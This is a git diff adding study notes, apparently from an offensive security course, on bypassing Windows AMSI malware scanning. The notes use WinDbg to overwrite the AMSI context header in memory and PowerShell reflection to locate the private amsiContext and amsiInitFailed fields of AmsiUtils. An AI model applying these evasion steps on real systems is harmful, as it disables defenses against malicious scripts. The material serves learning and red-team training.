@@ -192,7 +192,6 @@ onEnter: function (log, args, state) {
  log('|- result ' + args[5] + "\n");
  this.resultPointer = args[5];
 },
-
 ```
 
 and onLeave function as
@@ -226,6 +225,191 @@ Since this context structure is undocumented, we will use Frida to locate its ad
 and then use WinDbg to inspect its content. As before, we will open a PowerShell prompt and a 
 trace it with Frida. Then, we’ll enter another “test” string to obtain the address of the context 
 structure
+
+amsi context: 0x2c8cc81d510
+
+`dc address`
+
+000002c8`cc81d510  49534d41 00000000 cc84db40 000002c8  AMSI....@.......
+000002c8`cc81d520  c95e5410 000002c8 00000d62 00000000  .T^.....b.......
+000002c8`cc81d530  00000000 00000000 c9c080fe 90000b00  ................
+000002c8`cc81d540  cc81d540 000002c8 c94e7340 000002c8  @.......@sN.....
+000002c8`cc81d550  cc81dbe0 000002c8 c94e7a61 000002c8  ........azN.....
+000002c8`cc81d560  00000000 00000020 c9cf80fb 90000c00  .... ...........
+000002c8`cc81d570  cc81d570 000002c8 c94e7b20 000002c8  p....... {N.....
+000002c8`cc81d580  c94d6980 000002c8 c94e7341 000002c8  .iM.....AsN.....
+
+`u amsi!AmsiOpenSession`
+
+00007ffc`e9b63840 e9c3c81914      jmp     00007ffc`fdd00108
+00007ffc`e9b63845 4885c9          test    rcx,rcx
+00007ffc`e9b63848 7442            je      amsi!AmsiOpenSession+0x4c (00007ffc`e9b6388c)
+00007ffc`e9b6384a 8139414d5349    cmp     dword ptr [rcx],49534D41h
+00007ffc`e9b63850 753a            jne     amsi!AmsiOpenSession+0x4c (00007ffc`e9b6388c)
+00007ffc`e9b63852 4883790800      cmp     qword ptr [rcx+8],0
+00007ffc`e9b63857 7433            je      amsi!AmsiOpenSession+0x4c (00007ffc`e9b6388c)
+00007ffc`e9b63859 4883791000      cmp     qword ptr [rcx+10h],0
+
+``
+
+we go to the place where AMSI is defined and then
+
+```
+0:014> bp amsi!AmsiOpenSession
+```
+```
+0:014> g
+Breakpoint 0 hit
+amsi!AmsiOpenSession:
+00007fff`c75c24c0 e943dcdb0b jmp 00007fff`d3380108
+```
+```
+0:006> dc rcx L1
+000001f8`62fa6f40 49534d41 AMSI
+```
+```
+0:006> ed rcx 0
+```
+```
+0:006> dc rcx L1
+000001f8`62fa6f40 00000000 ....
+````
+```
+0:006> g
+```
+then `amsiutils`
+
+this requires manual intervention
+
+instead lets go for non manual implementation directlyform powershell.
+
+`$a=[Ref].Assembly.GetTypes()`
+
+`Foreach($b in $a) {if ($b.Name -like "*iUtils") {$c=$b}}`
+
+`$c.GetFields('NonePublic,Static')`
+
+```
+PS C:\Users\WIN10RED> $c.GetFields('NonPublic,Static')
+
+
+Name                   : amsiContext
+MetadataToken          : 67114382
+FieldHandle            : System.RuntimeFieldHandle
+Attributes             : Private, Static
+FieldType              : System.IntPtr
+MemberType             : Field
+ReflectedType          : System.Management.Automation.AmsiUtils
+DeclaringType          : System.Management.Automation.AmsiUtils
+Module                 : System.Management.Automation.dll
+IsPublic               : False
+IsPrivate              : True
+IsFamily               : False
+IsAssembly             : False
+IsFamilyAndAssembly    : False
+IsFamilyOrAssembly     : False
+IsStatic               : True
+IsInitOnly             : False
+IsLiteral              : False
+IsNotSerialized        : False
+IsSpecialName          : False
+IsPinvokeImpl          : False
+IsSecurityCritical     : True
+IsSecuritySafeCritical : False
+IsSecurityTransparent  : False
+CustomAttributes       : {}
+
+Name                   : amsiSession
+MetadataToken          : 67114383
+FieldHandle            : System.RuntimeFieldHandle
+Attributes             : Private, Static
+FieldType              : System.IntPtr
+MemberType             : Field
+ReflectedType          : System.Management.Automation.AmsiUtils
+DeclaringType          : System.Management.Automation.AmsiUtils
+Module                 : System.Management.Automation.dll
+IsPublic               : False
+IsPrivate              : True
+IsFamily               : False
+IsAssembly             : False
+IsFamilyAndAssembly    : False
+IsFamilyOrAssembly     : False
+IsStatic               : True
+IsInitOnly             : False
+IsLiteral              : False
+IsNotSerialized        : False
+IsSpecialName          : False
+IsPinvokeImpl          : False
+IsSecurityCritical     : True
+IsSecuritySafeCritical : False
+IsSecurityTransparent  : False
+CustomAttributes       : {}
+
+Name                   : amsiInitFailed
+MetadataToken          : 67114384
+FieldHandle            : System.RuntimeFieldHandle
+Attributes             : Private, Static
+FieldType              : System.Boolean
+MemberType             : Field
+ReflectedType          : System.Management.Automation.AmsiUtils
+DeclaringType          : System.Management.Automation.AmsiUtils
+Module                 : System.Management.Automation.dll
+IsPublic               : False
+IsPrivate              : True
+IsFamily               : False
+IsAssembly             : False
+IsFamilyAndAssembly    : False
+IsFamilyOrAssembly     : False
+IsStatic               : True
+IsInitOnly             : False
+IsLiteral              : False
+IsNotSerialized        : False
+IsSpecialName          : False
+IsPinvokeImpl          : False
+IsSecurityCritical     : True
+IsSecuritySafeCritical : False
+IsSecurityTransparent  : False
+CustomAttributes       : {}
+
+Name                   : amsiLockObject
+MetadataToken          : 67114385
+FieldHandle            : System.RuntimeFieldHandle
+Attributes             : Private, Static
+FieldType              : System.Object
+MemberType             : Field
+ReflectedType          : System.Management.Automation.AmsiUtils
+DeclaringType          : System.Management.Automation.AmsiUtils
+Module                 : System.Management.Automation.dll
+IsPublic               : False
+IsPrivate              : True
+IsFamily               : False
+IsAssembly             : False
+IsFamilyAndAssembly    : False
+IsFamilyOrAssembly     : False
+IsStatic               : True
+IsInitOnly             : False
+IsLiteral              : False
+IsNotSerialized        : False
+IsSpecialName          : False
+IsPinvokeImpl          : False
+IsSecurityCritical     : True
+IsSecuritySafeCritical : False
+IsSecurityTransparent  : False
+CustomAttributes       : {}
+```
+
+```
+PS C:\Users\Offsec> $d=$c.GetFields('NonPublic,Static')
+PS C:\Users\Offsec> Foreach($e in $d) {if ($e.Name -like "*Context") {$f=$e}}
+PS C:\Users\Offsec> $f.GetValue($null)
+3061447775504
+```
+converting to hex:
+0x2C8CC81D510
+
+
+
+
 
 
 
